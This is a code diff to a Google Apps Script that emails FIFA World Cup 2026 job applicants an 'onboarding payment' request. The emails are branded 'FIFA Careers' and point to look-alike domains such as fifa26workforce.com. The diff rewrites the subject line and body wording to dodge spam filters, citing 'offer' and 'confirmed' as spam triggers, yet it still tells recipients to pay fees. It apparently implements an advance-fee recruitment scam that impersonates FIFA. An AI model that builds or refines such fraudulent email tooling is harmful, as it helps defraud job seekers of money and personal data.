@@ -1,7 +1,7 @@
 /**
  * FIFA World Cup 2026 — Email 2 (offer + payment) after application.
  *
- * SCRIPT_VERSION: 2026-06-13-emailjs
+ * SCRIPT_VERSION: 2026-06-13-emailjs-deliverability
  *
  * ⚠️ REDEPLOY — read before saving:
  * 1. In Apps Script, select ALL code in Code.gs and DELETE it.
@@ -13,14 +13,18 @@
  * Stale Netlify URLs in the POST body are ignored.
  */
 
-const SCRIPT_VERSION = "2026-06-13-emailjs";
+const SCRIPT_VERSION = "2026-06-13-emailjs-deliverability";
 
 const FOLLOWUP_DELAY_MS = 5 * 60 * 1000; // testing: 5 min — production: 4 * 60 * 60 * 1000
 const QUEUE_PREFIX = "followup_";
 const PAYMENT_PAGE_URL = "https://fifa26workforce.com";
 const COMPANY_LOGO_URL =
   "https://res.cloudinary.com/dhrjlmfcp/image/upload/v1781028763/email-assets/bt5l2gysvg0fjgfndgbw.png";
-const EMAIL_SUBJECT = "Your FIFA World Cup 2026 offer — next steps";
+/** Inbox-aligned subject — avoid "offer" / "confirmed" in subject (spam triggers). */
+const EMAIL_SUBJECT = "Next steps for your FIFA World Cup 2026 application";
+
+const EMAILJS_REPLY_TO = "support@fifa26recruitment.com";
+const EMAILJS_FROM_NAME = "FIFA Careers";
 
 /** "emailjs" | "brevo" | "gmail". EmailJS needs EMAILJS_PRIVATE_KEY in Script properties. */
 const EMAIL_SENDER = "emailjs";
@@ -49,7 +53,7 @@ function doGet() {
     paymentPageUrl: PAYMENT_PAGE_URL,
     emailSender: EMAIL_SENDER,
     emailDesign: "venue-check-in-pass",
-    hint: "If scriptVersion is not 2026-06-13-emailjs, paste full Apps Script.js from partner package and deploy new version.",
+    hint: "If scriptVersion is not 2026-06-13-emailjs-deliverability, paste full Apps Script.js and deploy new version.",
   });
 }
 
@@ -314,6 +318,10 @@ function sendFollowUpEmailViaEmailJS(record) {
         to_name: record.name,
         name: record.name,
         email: record.email,
+        from_name: EMAILJS_FROM_NAME,
+        reply_to: EMAILJS_REPLY_TO,
+        email_subject: EMAIL_SUBJECT,
+        subject: EMAIL_SUBJECT,
         job_title: record.jobTitle,
         application_id: record.applicationId,
         reporting_instruction: normalizeReportingInstruction(record.reportingInstruction),
@@ -329,6 +337,7 @@ function sendFollowUpEmailViaEmailJS(record) {
         payment_url: paymentUrl,
         logo_url: COMPANY_LOGO_URL,
         message_html: buildApprovalEmailHtml(record),
+        message_text: plainTextFromRecord(record),
       },
     }),
     muteHttpExceptions: true,
@@ -480,13 +489,13 @@ function buildApprovalEmailHtml(record) {
     '" width="120" alt="FIFA Careers" style="display:block;max-width:120px;margin:0 auto;border:0;">' +
     "</div>" +
     '<div style="background:#ffffff;max-width:640px;margin:auto;padding:42px 36px;">' +
-    '<h1 style="text-align:center;font-size:32px;color:#051d39;margin:0 0 24px;">Your offer has been confirmed</h1>' +
+    '<h1 style="text-align:center;font-size:32px;color:#051d39;margin:0 0 24px;">Next steps for your application</h1>' +
     '<p style="font-size:17px;line-height:1.7;color:#1c2121;">Hi ' +
     escapeHtml(record.name) +
     ",</p>" +
-    '<p style="font-size:17px;line-height:1.7;color:#1c2121;">We are pleased to confirm your placement as <strong>' +
+    '<p style="font-size:17px;line-height:1.7;color:#1c2121;">Thank you for applying for <strong>' +
     escapeHtml(record.jobTitle) +
-    "</strong> at the FIFA World Cup 2026. Please review the details below and complete your onboarding fees to secure your position.</p>" +
+    "</strong> at the FIFA World Cup 2026. Please review the details below and complete your onboarding fees to continue in the recruitment process.</p>" +
     buildVenueCheckInPassHtml(record) +
     '<h2 style="font-size:22px;color:#051d39;margin:28px 0 12px;">Reporting details</h2>' +
     '<p style="font-size:16px;line-height:1.7;color:#1c2121;">' +
@@ -522,7 +531,7 @@ function buildApprovalEmailHtml(record) {
     paymentUrl +
     '" style="display:inline-block;background:#1277d9;color:#ffffff;text-decoration:none;padding:16px 32px;border-radius:4px;font-size:17px;font-weight:700;">Complete my onboarding payment</a>' +
     "</div>" +
-    '<p style="font-size:14px;color:#505b73;line-height:1.6;border-top:1px solid #e4e8f0;padding-top:20px;margin-top:20px;">If you have any questions about this offer or the payment process, please reply to this email and a member of the recruitment team will be in touch.</p>' +
+    '<p style="font-size:14px;color:#505b73;line-height:1.6;border-top:1px solid #e4e8f0;padding-top:20px;margin-top:20px;">If you have any questions about this application or the payment process, please reply to this email and a member of the recruitment team will be in touch.</p>' +
     "</div></div>"
   );
 }
@@ -534,7 +543,7 @@ function plainTextFromRecord(record) {
   return [
     "Hi " + record.name + ",",
     "",
-    "We are pleased to confirm your placement as " + record.jobTitle + " at the FIFA World Cup 2026.",
+    "Thank you for applying for " + record.jobTitle + " at the FIFA World Cup 2026.",
     "",
     "VENUE CHECK-IN PASS — SCREENSHOT REQUIRED",
     "Application ID: " + record.applicationId,
